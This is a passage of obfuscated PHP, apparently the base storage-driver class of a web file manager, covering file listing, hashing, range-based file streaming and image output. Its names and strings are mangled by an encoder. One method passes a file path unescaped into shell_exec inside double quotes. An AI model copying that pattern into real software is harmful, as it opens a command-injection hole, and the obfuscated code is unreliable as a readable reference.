$this->pathFather($—úî˜ø) . $ŸÂºÕ·‡; $²ÒÃğêÌ = IO::copy($—úî˜ø, $this->pathFather($—úî˜ø), REPEAT_RENAME_FOLDER, $½Ç»¿); if ($²ÒÃğêÌ) { IO::remove($—úî˜ø); } return $²ÒÃğêÌ ? $ŸÂºÕ·‡ : !1; } public function tempFile($Ù‹é¥¬° = '', $…¤·¶ = '') { if (!$Ù‹é¥¬°) { $Ù‹é¥¬° = rand_string(15); } $ÃÆÀ¥ı = TEMP_FILES . rand_string(15) . $_SERVER[¦»×‡Ãã][8]; @mkdir($ÃÆÀ¥ı, DEFAULT_PERRMISSIONS, !0); $‡ùıÜ = $ÃÆÀ¥ı . $Ù‹é¥¬°; @touch($‡ùıÜ); if ($…¤·¶) { file_put_contents($‡ùıÜ, $…¤·¶); } return $‡ùıÜ; } public function tempFileRemve($´Şü¥•É) { @unlink($´Şü¥•É); @rmdir($this->pathFather($´Şü¥•É)); } public function mkfile($Ù³Á½¸ñ, $ùú“òõ› = '', $İïÀƒ€÷ = REPEAT_RENAME) { } public function mkdir($··¯õ¦¡, $„ıéÀüã = REPEAT_SKIP) { } public function delFile($îóÚŠ»Ô) { } public function delFolder($ÈÅŒ¶µ) { } public function copyFile($·¿‚¥¹Æ, $Ï–à·Ùú) { } public function moveFile($á§˜…¹, $ÏÄùõ“ª) { } public function remove($¤¦‚Åã) { if ($this->isFile($¤¦‚Åã)) { return $this->delFile($¤¦‚Åã); } return $this->delFolder($¤¦‚Åã); } public function rename($“½Ê¼½€, $Æ«À€º·) { } public function exist($áÑÜÙ¥) { } public function findByHash($¾®†üÏÑ = '', $¿§ñÂÊ = '') { return !1; } public function isFile($Áş¹Ó­½) { } public function isFolder($¬›Ç†Ğ) { } public function size($ËæãòÖÎ) { } public function info($Õö¢°şÄ) { } public function infoSimple($ÚïØî€) { return $this->info($ÚïØî€); } public function infoAuth($Ë•ÙŒ) { return $this->info($Ë•ÙŒ); } public function infoFull($«›÷şÈ) { return $this->info($«›÷şÈ); } public function infoFullSimple($‘òºê‰) { return $this->info($‘òºê‰); } public function infoWithChildren($õ©¸ÙİŠ) { $çñÔºÙ =& $_SERVER[¦»×‡Ãã]; static $ú¸¬÷ÑÉ = array(); if (isset($ú¸¬÷ÑÉ[$õ©¸ÙİŠ])) { return $ú¸¬÷ÑÉ[$õ©¸ÙİŠ]; } $£ÄÍ™½­ = $this->info($õ©¸ÙİŠ); if ($£ÄÍ™½­ && $£ÄÍ™½­[$çñÔºÙ[33]] == $çñÔºÙ[78]) { $¼«Õæšº = array($çñÔºÙ[79] => 0, $çñÔºÙ[80] => 0, $çñÔºÙ[81] => 0); $this->infoChildren($õ©¸ÙİŠ, $¼«Õæšº); $£ÄÍ™½­[$çñÔºÙ[79]] = $¼«Õæšº[$çñÔºÙ[79]]; $£ÄÍ™½­[$çñÔºÙ[82]] = array($çñÔºÙ[83] => $¼«Õæšº[$çñÔºÙ[80]], $çñÔºÙ[84] => $¼«Õæšº[$çñÔºÙ[81]]); $ú¸¬÷ÑÉ[$õ©¸ÙİŠ] = $£ÄÍ™½­; } return $£ÄÍ™½­; } public function listPath($ö¡Ò‹Ş¯, $ê±ûåÙ½ = false) { } public function has($İƒ§û, $Çç¾¸–ª = false, $…êæŠÏ· = false) { } public function canRead($ÃÛğ³¯ ) { } public function canWrite($š©¢ú“û) { } public function getContent($†š¹ÅÍ°) { } public function setContent($»·Ø±¯Ê, $º‘ Š€à = '') { } protected function infoChildren($·Œ¨” ¦, &$•©‰Â­Ş) { $°ÇŞÖÙ® =& $_SERVER[¦»×‡Ãã]; check_abort_echo(); $ØİúôôÑ = $this->listPath($·Œ¨” ¦, !0); $ØİúôôÑ = array_merge($ØİúôôÑ[$°ÇŞÖÙ®[85]], $ØİúôôÑ[$°ÇŞÖÙ®[86]]); foreach ($ØİúôôÑ as $ğ­«ÅØ¦) { if ($ğ­«ÅØ¦[$°ÇŞÖÙ®[33]] == $°ÇŞÖÙ®[78]) { $•©‰Â­Ş[$°ÇŞÖÙ®[81]]++; $òÜÁß‚ = $this->getPathInner($ğ­«ÅØ¦[$°ÇŞÖÙ®[87]]); $this->infoChildren($òÜÁß‚, $•©‰Â­Ş); } else { $•©‰Â­Ş[$°ÇŞÖÙ®[80]]++; $•©‰Â­Ş[$°ÇŞÖÙ®[79]] += $ğ­«ÅØ¦[$°ÇŞÖÙ®[79]]; } } } public function fileSubstr($·ŸÆûœ´, $ßõÜ¡îÚ, $Ó³´İşç) { } public function listAll($“ª¸ÎŞ«) { } public function listAllMake($ÄòÉè¬Ù, &$´Ü¾Ÿú«) { $Š…ãûÏ =& $_SERVER[¦»×‡Ãã]; check_abort_echo(); $Å¦…ŠóÎ = $this->listPath($ÄòÉè¬Ù, !0); if (!$Å¦…ŠóÎ) { return; } $¶ËŒÄ† = array_merge($Å¦…ŠóÎ[$Š…ãûÏ[85]], $Å¦…ŠóÎ[$Š…ãûÏ[86]]); foreach ($¶ËŒÄ† as $Ÿ¶àÓ¢Í) { $óÙ€ˆÓÖ = $Ÿ¶àÓ¢Í[$Š…ãûÏ[33]] == $Š…ãûÏ[78]; $¨åÙù‘œ = array($Š…ãûÏ[87] => $Ÿ¶àÓ¢Í[$Š…ãûÏ[87]], $Š…ãûÏ[78] => $óÙ€ˆÓÖ); if (isset($Ÿ¶àÓ¢Í[$Š…ãûÏ[79]])) { $¨åÙù‘œ[$Š…ãûÏ[79]] = $Ÿ¶àÓ¢Í[$Š…ãûÏ[79]]; } if (isset($Ÿ¶àÓ¢Í[$Š…ãûÏ[88]])) { $¨åÙù‘œ[$Š…ãûÏ[88]] = $Ÿ¶àÓ¢Í[$Š…ãûÏ[88]]; } if (!$óÙ€ˆÓÖ) { $´Ü¾Ÿú«[] = $¨åÙù‘œ; continue; } $´Ü¾Ÿú«[] = $¨åÙù‘œ; $¡ûïğ„ = $Ÿ¶àÓ¢Í[$Š…ãûÏ[87]]; $ªüÃÜÀ» = $this->pathDriver; if (substr($Ÿ¶àÓ¢Í[$Š…ãûÏ[87]], 0, strlen($ªüÃÜÀ»)) == $ªüÃÜÀ») { $¡ûïğ„ = substr($¡ûïğ„, strlen($ªüÃÜÀ»)); } $this->listAllMake($¡ûïğ„, $´Ü¾Ÿú«); } } public function listAllSimple($½úØÌíù, $Ìß•”¥Î = false) { $’»òü¬¤ = $this->listAll($½úØÌíù); return $this->listAllSimpleMake($’»òü¬¤, $this->getPathOuter($½úØÌíù), $Ìß•”¥Î); } public function listAllSimpleMake($Ä¯ÕŞ×, $¯¡­›°¾, $Â•–¹¥Ü) { $Òá¡»°¯ =& $_SERVER[¦»×‡Ãã]; $«ãË£ = array(); $¯¡­›°¾ = rtrim(get_path_father($¯¡­›°¾), $Òá¡»°¯[8]) . $Òá¡»°¯[8]; foreach ($Ä¯ÕŞ× as $Óƒ·Ã¥Ã) { $ŞûÛôÀ = array($Òá¡»°¯[87] => $Óƒ·Ã¥Ã[$Òá¡»°¯[87]], $Òá¡»°¯[89] => $Óƒ·Ã¥Ã[$Òá¡»°¯[87]], $Òá¡»°¯[78] => $Óƒ·Ã¥Ã[$Òá¡»°¯[78]]); if (isset($Óƒ·Ã¥Ã[$Òá¡»°¯[79]]) && !$Óƒ·Ã¥Ã[$Òá¡»°¯[78]]) { $ŞûÛôÀ[$Òá¡»°¯[79]] = $Óƒ·Ã¥Ã[$Òá¡»°¯[79]]; } if (isset($Óƒ·Ã¥Ã[$Òá¡»°¯[88]])) { $ŞûÛôÀ[$Òá¡»°¯[88]] = $Óƒ·Ã¥Ã[$Òá¡»°¯[88]]; } if (is_array($Óƒ·Ã¥Ã[$Òá¡»°¯[90]])) { $ŞûÛôÀ[$Òá¡»°¯[89]] = $Óƒ·Ã¥Ã[$Òá¡»°¯[90]][$Òá¡»°¯[87]]; $ŞûÛôÀ[$Òá¡»°¯[79]] = $Óƒ·Ã¥Ã[$Òá¡»°¯[90]][$Òá¡»°¯[79]]; $ŞûÛôÀ[$Òá¡»°¯[88]] = $Óƒ·Ã¥Ã[$Òá¡»°¯[90]][$Òá¡»°¯[88]]; } else { if (substr($Óƒ·Ã¥Ã[$Òá¡»°¯[87]], 0, strlen($¯¡­›°¾)) == $¯¡­›°¾) { $ŞûÛôÀ[$Òá¡»°¯[87]] = substr($Óƒ·Ã¥Ã[$Òá¡»°¯[87]], strlen($¯¡­›°¾)); } } $Ì¡á–‹¸ = $Óƒ·Ã¥Ã[$Òá¡»°¯[78]] ? $Òá¡»°¯[8] : $Òá¡»°¯[12]; $ŞûÛôÀ[$Òá¡»°¯[89]] = rtrim($ŞûÛôÀ[$Òá¡»°¯[89]], $Òá¡»°¯[8]) . $Ì¡á–‹¸; $ŞûÛôÀ[$Òá¡»°¯[87]] = $Òá¡»°¯[8] . trim($ŞûÛôÀ[$Òá¡»°¯[87]], $Òá¡»°¯[8]) . $Ì¡á–‹¸; if (!$Â•–¹¥Ü) { $ï›ˆÏ¿× = explode($Òá¡»°¯[8], trim($ŞûÛôÀ[$Òá¡»°¯[87]], $Òá¡»°¯[8])); $ŞûÛôÀ[$Òá¡»°¯[87]] = $Òá¡»°¯[8] . implode($Òá¡»°¯[8], array_slice($ï›ˆÏ¿×, 1)) . $Ì¡á–‹¸; } $«ãË£[] = $ŞûÛôÀ; } return array_sort_by($«ãË£, $Òá¡»°¯[87]); } public function upload($ê©òäÎî, $˜ì½ÊŠ°, $Îô‹ÍŸ = false, $¦çıŠƒü = REPEAT_REPLACE) { } public function uploadFileByID($Ï‹å»¶Á, $ø®œ€Â, $Ò‚ÏŠÓí) { } public function uploadFileByPath($ØÌÌÍÎÅ, $ÄØ§ò¡«, $÷ÄúøåÚ = array()) { } public function isUploadServer() { $Ä‘îº” =& $_SERVER[¦»×‡Ãã]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ä‘îº”[91]) { return !0; } return $GLOBALS[$Ä‘îº”[6]][$Ä‘îº”[92]][$Ä‘îº”[93]]; } public function isFileOutServer() { $ê‘´±¿ù =& $_SERVER[¦»×‡Ãã]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ê‘´±¿ù[91]) { return !0; } return $GLOBALS[$ê‘´±¿ù[6]][$ê‘´±¿ù[92]][$ê‘´±¿ù[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($š¯Ñ¹†é) { $Äİ…÷‚ =& $_SERVER[¦»×‡Ãã]; if (!$this->isCdnHost()) { return $š¯Ñ¹†é; } return str_replace(trim(get_url_root($š¯Ñ¹†é), $Äİ…÷‚[8]), trim($this->cdnHost, $Äİ…÷‚[8]), $š¯Ñ¹†é); } public function uploadLink($èîÒ¨òİ, $‰ö›ÌêĞ = 0) { $£ÛäíÅÀ =& $_SERVER[¦»×‡Ãã]; if ($this->isUploadServer()) { return; } $Ö„ŞÈÒ = $this->getType(); if (!in_array($Ö„ŞÈÒ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ò­±ç°ï = 1024 * 1024 * 10; $“‘şÈÜ = $‰ö›ÌêĞ <= $ò­±ç°ï ? $£ÛäíÅÀ[95] : $£ÛäíÅÀ[96]; $ó£ïİËã = (!$‰ö›ÌêĞ ? 1 : ceil($‰ö›ÌêĞ / pow(1024, 3))) * 3600 * 4; $¹ÏÜ™œ• = $this->{$“‘şÈÜ}($èîÒ¨òİ, $ó£ïİËã); if ($¹ÏÜ™œ•) { $¹ÏÜ™œ•[$£ÛäíÅÀ[97]] = $èîÒ¨òİ; $¹ÏÜ™œ•[$£ÛäíÅÀ[98]] = $Ö„ŞÈÒ; } return $¹ÏÜ™œ•; } public function uploadFormData($ˆ¶ƒĞ°ö, $€§ƒ²²¾ = 3600) { } public function multiUploadFormData($üå¢ûİÌ, $õ¡æ­¿Ï = 3600) { } public function download($§¢Â÷Â†, $‚ôÔï¾â) { } public function ext($ˆÔœşÂ¨) { $ëûœÓ‡ =& $_SERVER[¦»×‡Ãã]; if (strpos($ˆÔœşÂ¨, $ëûœÓ‡[8]) === -1) { $™ÚŸü½ó = $ˆÔœşÂ¨; } else { $™ÚŸü½ó = $this->pathThis($ˆÔœşÂ¨); } $˜¤ÓÓˆá = $ëûœÓ‡[12]; if (strstr($™ÚŸü½ó, $ëûœÓ‡[10])) { $˜¤ÓÓˆá = substr($™ÚŸü½ó, strrpos($™ÚŸü½ó, $ëûœÓ‡[10]) + 1); $˜¤ÓÓˆá = strtolower($˜¤ÓÓˆá); } if (strlen($˜¤ÓÓˆá) > 3 && preg_match($ëûœÓ‡[99], $˜¤ÓÓˆá, $ËÖ¢ÈØ)) { $˜¤ÓÓˆá = $ëûœÓ‡[12]; } return $˜¤ÓÓˆá; } public function pathThis($®ÜÇöÕ) { $Ÿìêˆæà =& $_SERVER[¦»×‡Ãã]; $®ÜÇöÕ = str_replace($Ÿìêˆæà[100], $Ÿìêˆæà[8], rtrim($®ÜÇöÕ, $Ÿìêˆæà[8])); $Ò¶ÏÍã = strrpos($®ÜÇöÕ, $Ÿìêˆæà[8]); if ($Ò¶ÏÍã === !1) { return $®ÜÇöÕ; } return substr($®ÜÇöÕ, $Ò¶ÏÍã + 1); } public function pathFather($¿—öÍÜí) { $ß·¯½µ =& $_SERVER[¦»×‡Ãã]; $¿—öÍÜí = str_replace($ß·¯½µ[100], $ß·¯½µ[8], rtrim($¿—öÍÜí, $ß·¯½µ[8])); $”‘éŒÄ™ = strrpos($¿—öÍÜí, $ß·¯½µ[8]); if ($”‘éŒÄ™ === !1) { return $ß·¯½µ[12]; } return substr($¿—öÍÜí, 0, $”‘éŒÄ™ + 1); } public function hashSimple($½Û»ÂÖ‹) { $É·ØÆü =& $_SERVER[¦»×‡Ãã]; if (!$½Û»ÂÖ‹) { return md5($É·ØÆü[12]); } $ß’¥°÷ = $this->size($½Û»ÂÖ‹); $¿µ¤šëú = 200; $â¡‚–Ê = 50; if ($ß’¥°÷ <= $¿µ¤šëú * $â¡‚–Ê) { return $this->hashMd5($½Û»ÂÖ‹) . $ß’¥°÷; } $áõ¬ÖÌò = intval($ß’¥°÷ / $â¡‚–Ê); $æ–¯¾¢” = $É·ØÆü[12]; for ($Ìîïîı‘ = 0; $Ìîïîı‘ < $â¡‚–Ê; $Ìîïîı‘++) { $æ–¯¾¢” .= $this->fileSubstr($½Û»ÂÖ‹, $áõ¬ÖÌò * $Ìîïîı‘, $¿µ¤šëú); } $æ–¯¾¢” .= $this->fileSubstr($½Û»ÂÖ‹, $ß’¥°÷ - $¿µ¤šëú, $¿µ¤šëú); return md5($æ–¯¾¢”) . $ß’¥°÷; } public static $md5Cache = array(); public function hashMd5($ñäœâÒ) { if (!$ñäœâÒ) { return md5($_SERVER[¦»×‡Ãã][12]); } $ñäœâÒ = $this->iconvSystem($ñäœâÒ); if (isset(self::$md5Cache[$ñäœâÒ])) { return self::$md5Cache[$ñäœâÒ]; } self::$md5Cache[$ñäœâÒ] = $this->hashMd5Shell($ñäœâÒ); if (!self::$md5Cache[$ñäœâÒ]) { self::$md5Cache[$ñäœâÒ] = @md5_file($ñäœâÒ); } return self::$md5Cache[$ñäœâÒ]; } private function hashMd5Shell($Î£êå€œ) { $äÍ—ç¶¡ =& $_SERVER[¦»×‡Ãã]; if (!$Î£êå€œ) { return md5($äÍ—ç¶¡[12]); } if (!function_exists($äÍ—ç¶¡[101])) { return !1; } $”“ß¿ÉÖ = array($äÍ—ç¶¡[102], $äÍ—ç¶¡[103]); $£Ë¼ì¯« = Cache::get($äÍ—ç¶¡[104]); if (!$£Ë¼ì¯«) { $Ë›ÜÍµÛ = BASIC_PATH . $äÍ—ç¶¡[105]; $‚®ë¦á™ = md5_file($Ë›ÜÍµÛ); $£Ë¼ì¯« = $äÍ—ç¶¡[106]; foreach ($”“ß¿ÉÖ as $àë´ŒÑÓ) { $Ë¥‹äØß = shell_exec($àë´ŒÑÓ . "\x20\x22{$Ë›ÜÍµÛ}\42"); if ($Ë¥‹äØß && substr(trim($Ë¥‹äØß), 0, 32) == $‚®ë¦á™) { $£Ë¼ì¯« = $àë´ŒÑÓ; break; } } Cache::set($äÍ—ç¶¡[104], $£Ë¼ì¯«, 3600); } if ($£Ë¼ì¯« == $äÍ—ç¶¡[106]) { return !1; } $Ë¥‹äØß = shell_exec($£Ë¼ì¯« . "\40\x22{$Î£êå€œ}\42"); $Ë¥‹äØß = str_replace($äÍ—ç¶¡[107], $äÍ—ç¶¡[12], $Ë¥‹äØß); return substr($Ë¥‹äØß, 0, 32); } public function link($œâ¯¨…™) { return $œâ¯¨…™; } public function fileOut($Ö·çÄ, $‹Î€ŸÎ† = false, $íË ¡êÊ = false, $¬…ëµº” = '') { $—–¡èºÛ =& $_SERVER[¦»×‡Ãã]; $this->cacheMethod(null, null); if (!$Ö·çÄ || !$this->exist($Ö·çÄ)) { show_json(LNG($—–¡èºÛ[108]), !1, $íË ¡êÊ); } $ëûÛÎÇ = $this->getType() == $—–¡èºÛ[109]; $•¼–™Ôà = $GLOBALS[$—–¡èºÛ[6]][$—–¡èºÛ[92]][$—–¡èºÛ[110]][$—–¡èºÛ[111]]; $İşşÃÖá = (double) $GLOBALS[$—–¡èºÛ[6]][$—–¡èºÛ[92]][$—–¡èºÛ[110]][$—–¡èºÛ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ô½„ü¬» = $this->infoFull($Ö·çÄ); $î‘½şŒ¬ = $Ô½„ü¬»[$—–¡èºÛ[79]]; $ö‚‘”¥´ = gmdate($—–¡èºÛ[113], $Ô½„ü¬»[$—–¡èºÛ[88]]); $ßˆŸ€ö¸ = $íË ¡êÊ ? $íË ¡êÊ : $this->iconvApp($Ô½„ü¬»[$—–¡èºÛ[32]]); $Û¢³Ø¢ = 0; $ä†×ÛÑ = $î‘½şŒ¬ - 1; $¿áß© = $this->ext($ßˆŸ€ö¸); if (in_array($¿áß©, array($—–¡èºÛ[114], $—–¡èºÛ[115], $—–¡èºÛ[116], $—–¡èºÛ[117]))) { $¿áß© = $—–¡èºÛ[118]; } if (in_array($¿áß©, array($—–¡èºÛ[119]))) { $¿áß© = $—–¡èºÛ[120]; } if (!$¬…ëµº”) { $¬…ëµº” = md5($ö‚‘”¥´ . $î‘½şŒ¬); } $¬…ëµº” = $—–¡èºÛ[121] . $¬…ëµº” . $—–¡èºÛ[121]; $òîÌ„ˆ´ = get_file_mime($¿áß©); $ğúš¨öš = !0; $ğúš¨öš = isset($_GET[$—–¡èºÛ[122]]) ? !1 : !0; if ($‹Î€ŸÎ† === !1 && !mime_support($òîÌ„ˆ´)) { $òîÌ„ˆ´ = $—–¡èºÛ[123]; } header($—–¡èºÛ[124]); header($—–¡èºÛ[125] . $òîÌ„ˆ´); $à ÛÙ = rawurlencode($ßˆŸ€ö¸); $à ÛÙ = $—–¡èºÛ[121] . $à ÛÙ . $—–¡èºÛ[126] . $à ÛÙ; if ($‹Î€ŸÎ†) { header($—–¡èºÛ[127]); header($—–¡èºÛ[128] . $à ÛÙ); } else { if ($ğúš¨öš) { header($—–¡èºÛ[129] . $à ÛÙ); } } $×»úë†¿ = 3600 * 24 * 30; header($—–¡èºÛ[130]); header($—–¡èºÛ[131]); header($—–¡èºÛ[132] . $×»úë†¿); header($—–¡èºÛ[133] . gmdate($—–¡èºÛ[113], time() + $×»úë†¿) . $—–¡èºÛ[134]); if (isset($_SERVER[$—–¡èºÛ[135]]) && strtotime($_SERVER[$—–¡èºÛ[135]]) == $Ô½„ü¬»[$—–¡èºÛ[88]]) { header($—–¡èºÛ[136], !0, 304); die; } if (isset($_SERVER[$—–¡èºÛ[137]]) && $_SERVER[$—–¡èºÛ[137]] == $¬…ëµº”) { header($—–¡èºÛ[138] . $¬…ëµº”, !0, 304); die; } header($—–¡èºÛ[138] . $¬…ëµº”); header($—–¡èºÛ[139] . $ö‚‘”¥´ . $—–¡èºÛ[134]); header($—–¡èºÛ[140] . $ßˆŸ€ö¸); header($—–¡èºÛ[141]); header($—–¡èºÛ[142] . $î‘½şŒ¬); header($—–¡èºÛ[143]); Hook::trigger($—–¡èºÛ[144], $Ö·çÄ, $î‘½şŒ¬, $ßˆŸ€ö¸, $¿áß©); if (!$‹Î€ŸÎ† && $¿áß© == $—–¡èºÛ[145]) { if ($î‘½şŒ¬ > 1024 * 1024 * 5) { die; } $×åÆÀ¾ = $this->getContent($Ö·çÄ); $×åÆÀ¾ = Html::clearSVG($×åÆÀ¾); header($—–¡èºÛ[146] . strlen($×åÆÀ¾)); echo $×åÆÀ¾; die; } $¦ÀûÙµÜ = strtolower($_SERVER[$—–¡èºÛ[147]]); if ($ëûÛÎÇ && $¦ÀûÙµÜ && $•¼–™Ôà) { if (strstr($¦ÀûÙµÜ, $—–¡èºÛ[148])) { header($—–¡èºÛ[149] . $Ö·çÄ); } else { if (strstr($¦ÀûÙµÜ, $—–¡èºÛ[150])) { header($—–¡èºÛ[151] . $Ö·çÄ); } else { if (strstr($¦ÀûÙµÜ, $—–¡èºÛ[152])) { header($—–¡èºÛ[153] . $Ö·çÄ); } } } if ($İşşÃÖá) { header($—–¡èºÛ[154] . $İşşÃÖá); } return; } if (isset($_SERVER[$—–¡èºÛ[155]])) { if (preg_match($—–¡èºÛ[156], $_SERVER[$—–¡èºÛ[155]], $é£ŸÜäÒ)) { $Û¢³Ø¢ = intval($é£ŸÜäÒ[1]); $Û¢³Ø¢ = $Û¢³Ø¢ <= 0 ? 0 : ($Û¢³Ø¢ >= $ä†×ÛÑ ? $ä†×ÛÑ : $Û¢³Ø¢); if (!empty($é£ŸÜäÒ[2])) { $¶…Ïí¬õ = intval($é£ŸÜäÒ[2]); $ä†×ÛÑ = $¶…Ïí¬õ < $Û¢³Ø¢ ? $Û¢³Ø¢ : ($¶…Ïí¬õ >= $ä†×ÛÑ ? $ä†×ÛÑ : $¶…Ïí¬õ); } } header($—–¡èºÛ[157]); header("\103\x6f\156\164\145\x6e\x74\x2d\x52\x61\x6e\x67\145\x3a\40\x62\x79\x74\x65\x73\40{$Û¢³Ø¢}\55{$ä†×ÛÑ}\x2f" . $î‘½şŒ¬); } else { header($—–¡èºÛ[158]); } header($—–¡èºÛ[159]); header($—–¡èºÛ[160]); $†ªóÁÙ = !0; if ($_SERVER[$—–¡èºÛ[161]] == $—–¡èºÛ[162] && $î‘½şŒ¬ > 1204 * 1024 * 1024 * 2) { $†ªóÁÙ = !1; } if ($†ªóÁÙ) { header($—–¡èºÛ[163] . ($ä†×ÛÑ - $Û¢³Ø¢ + 1)); } if ($_SERVER[$—–¡èºÛ[164]] == $—–¡èºÛ[165]) { return; } $ãÎËªÓª = array($—–¡èºÛ[166] => !1, $—–¡èºÛ[167] => $Û¢³Ø¢, $—–¡èºÛ[168] => $ä†×ÛÑ, $—–¡èºÛ[169] => $¿áß©, $—–¡èºÛ[170] => $Ô½„ü¬», $—–¡èºÛ[171] => $—–¡èºÛ[12], $—–¡èºÛ[172] => 0); $ãÎËªÓª = Hook::filter($—–¡èºÛ[173], $ãÎËªÓª); $Ùô«´ÂÂ = 1024 * 300; $åşÓ¢€ = 0; if ($İşşÃÖá) { $åşÓ¢€ = intval(1000 * 1000 * ($Ùô«´ÂÂ / $İşşÃÖá)); } while ($Û¢³Ø¢ <= $ä†×ÛÑ) { $‹ŒôİÄ = timeFloat(); check_abort(); $ô˜ü¢Ïœ = $ä†×ÛÑ - $Û¢³Ø¢ + 1; if ($ô˜ü¢Ïœ <= $Ùô«´ÂÂ) { $Ùô«´ÂÂ = $ô˜ü¢Ïœ; } $×åÆÀ¾ = $this->fileSubstr($Ö·çÄ, $Û¢³Ø¢, $Ùô«´ÂÂ); if ($ãÎËªÓª[$—–¡èºÛ[166]]) { $ãÎËªÓª[$—–¡èºÛ[171]] = $×åÆÀ¾; $ãÎËªÓª[$—–¡èºÛ[172]] = $Û¢³Ø¢; $ãÎËªÓª = Hook::filter($—–¡èºÛ[174], $ãÎËªÓª); $×åÆÀ¾ = $ãÎËªÓª[$—–¡èºÛ[171]]; } echo $×åÆÀ¾; $Û¢³Ø¢ += $Ùô«´ÂÂ; if ($Ùô«´ÂÂ == $ô˜ü¢Ïœ) { $Û¢³Ø¢ = $ä†×ÛÑ + 1; } if ($åşÓ¢€) { $øÌ‡˜µ€ = intval(1000 * 1000 * (timeFloat() - $‹ŒôİÄ)); $œ©»»À = $åşÓ¢€ - $øÌ‡˜µ€; if ($œ©»»À > 5) { usleep($œ©»»À); } } } } public function fileOutServer($ÅüÙ¾ì¹, $ı–ªœø = false, $–¯ö³´ó = false, $ûûÜ¨ù = '') { $this->fileOut($ÅüÙ¾ì¹, $ı–ªœø, $–¯ö³´ó, $ûûÜ¨ù); } public function fileOutLink($ˆùü©ÙË) { header($_SERVER[¦»×‡Ãã][175] . $ˆùü©ÙË); die; } public function cacheMethod($ËëæÇîÃ, $‹ÎóÂçĞ, $‰šÑ…Åú = null) { $¬¥ê—ªÁ =& $_SERVER[¦»×‡Ãã]; static $ßÍı±³¿ = array(); $°Ñ»ü¤ = $‹ÎóÂçĞ ? ltrim($this->getPathOuter($‹ÎóÂçĞ), $¬¥ê—ªÁ[8]) : $¬¥ê—ªÁ[12]; $–¾À‡ÍË = $¬¥ê—ªÁ[176] . $ËëæÇîÃ . $¬¥ê—ªÁ[177] . rtrim($°Ñ»ü¤, $¬¥ê—ªÁ[8]); if (is_null($ËëæÇîÃ)) { $ßÍı±³¿ = array(); return; } if (is_null($‹ÎóÂçĞ)) { foreach ($ßÍı±³¿ as $–¾À‡ÍË => $í¼½ÊÔ) { if (!strstr($–¾À‡ÍË, $¬¥ê—ªÁ[176] . $ËëæÇîÃ . $¬¥ê—ªÁ[178])) { continue; } unset($ßÍı±³¿[$–¾À‡ÍË]); } return; } if (!is_null($‰šÑ…Åú)) { $ßÍı±³¿[$–¾À‡ÍË] = $‰šÑ…Åú; return; } $´­¿±Öé = isset($ßÍı±³¿[$–¾À‡ÍË]) ? $ßÍı±³¿[$–¾À‡ÍË] : null; if (!is_null($´­¿±Öé)) { return $´­¿±Öé; } $´­¿±Öé = $this->{$ËëæÇîÃ}($‹ÎóÂçĞ); $ßÍı±³¿[$–¾À‡ÍË] = $´­¿±Öé; return $´­¿±Öé; } public function cacheMethodInfoSet($ù¡˜†í, $›¹š¾Ğ, $è¼·Öë = false) { $ ÊÊó¶¥ =& $_SERVER[¦»×‡Ãã]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ ÊÊó¶¥[179], $ù¡˜†í, $›¹š¾Ğ); $this->cacheMethod($ ÊÊó¶¥[180], $ù¡˜†í, $›¹š¾Ğ ? !1 : !0); if (is_array($è¼·Öë)) { $this->cacheMethod($ ÊÊó¶¥[181], $ù¡˜†í, $è¼·Öë); } } public function fileOutImage($èÆä˜ä‡, $°Ùê¿Óø = 250) { $ÀÊ’™´¯ =& $_SERVER[¦»×‡Ãã]; set_timeout(); if (substr($èÆä˜ä‡, 0, 4) == $ÀÊ’™´¯[152]) { $this->fileOutLink($èÆä˜ä‡); } $¦çËƒ = $this->info($èÆä˜ä‡); $¬»™¡É = !1; $¥ÀÖµùş = isset($GLOBALS[$ÀÊ’™´¯[182]]) ? $GLOBALS[$ÀÊ’™´¯[182]] : array(); if ($¥ÀÖµùş && $¥ÀÖµùş[$ÀÊ’™´¯[183]] == $¦çËƒ[$ÀÊ’™´¯[87]]) { $¦çËƒ = $¥ÀÖµùş; $“˜“Ëşç = $¦çËƒ[$ÀÊ’™´¯[184]]; if ($“˜“Ëşç && isset($“˜“Ëşç[$ÀÊ’™´¯[185]])) { if ($“˜“Ëşç[$ÀÊ’™´¯[185]] <= $°Ùê¿Óø && $“˜“Ëşç[$ÀÊ’™´¯[186]] <= $°Ùê¿Óø) { $¬»™¡É = !0; } } } if ($¦çËƒ[$ÀÊ’™´¯[79]] <= 1024 * 50 || $¬»™¡É || !function_exists($ÀÊ’™´¯[187]) || $¦çËƒ[$ÀÊ’™´¯[169]] == $ÀÊ’™´¯[188]) { return $this->fileOut($èÆä˜ä‡, !1, $¦çËƒ[$ÀÊ’™´¯[32]]); } $¯Ø’İüæ = kodIO::hashPath($¦çËƒ); $¦õ‹ş = "\143\x6f\166\145\162\x5f{$¯Ø’İüæ}\x5f{$°Ùê¿Óø}\x2e\160\156\x67"; $Ò¬©ÂŞÓ = IO_PATH_SYSTEM_TEMP . $ÀÊ’™´¯[189]; $œºÌÂÅ› = IO::infoFullSimple($Ò¬©ÂŞÓ); $üğê«Ì = $œºÌÂÅ› && is_array($œºÌÂÅ›) ? $œºÌÂÅ›[$ÀÊ’™´¯[87]] : $ÀÊ’™´¯[12]; if (!$üğê«Ì) { $üğê«Ì = IO::mkdir($Ò¬©ÂŞÓ); } if ($¦çËƒ[$ÀÊ’™´¯[190]] == $ÀÊ’™´¯[191] && isset($¦çËƒ[$ÀÊ’™´¯[192]]) && $¦çËƒ[$ÀÊ’™´¯[192]] == kodIO::sourceID($üğê«Ì)) { $º€î—³¶ = $¦çËƒ[$ÀÊ’™´¯[193]]; if ($°Ùê¿Óø <= 500) { $¯öší‘¸ = preg_replace($ÀÊ’™´¯[194], $ÀÊ’™´¯[195], $¦çËƒ[$ÀÊ’™´¯[32]]); $º€î—³¶ = IO::fileNameExist($üğê«Ì, $¯öší‘¸); } return IO::fileOut(KodIO::make($º€î—³¶), !1, $¦çËƒ[$ÀÊ’™´¯[32]]); } $ºˆº„°Ö = IO::fileNameExist($üğê«Ì, $¦õ‹ş); if ($ºˆº„°Ö) { return IO::fileOut(KodIO::make($ºˆº„°Ö), !1, $¦çËƒ[$ÀÊ’™´¯[32]]); } if ($°Ùê¿Óø > 1000) { $this->makeImageCover($üğê«Ì, 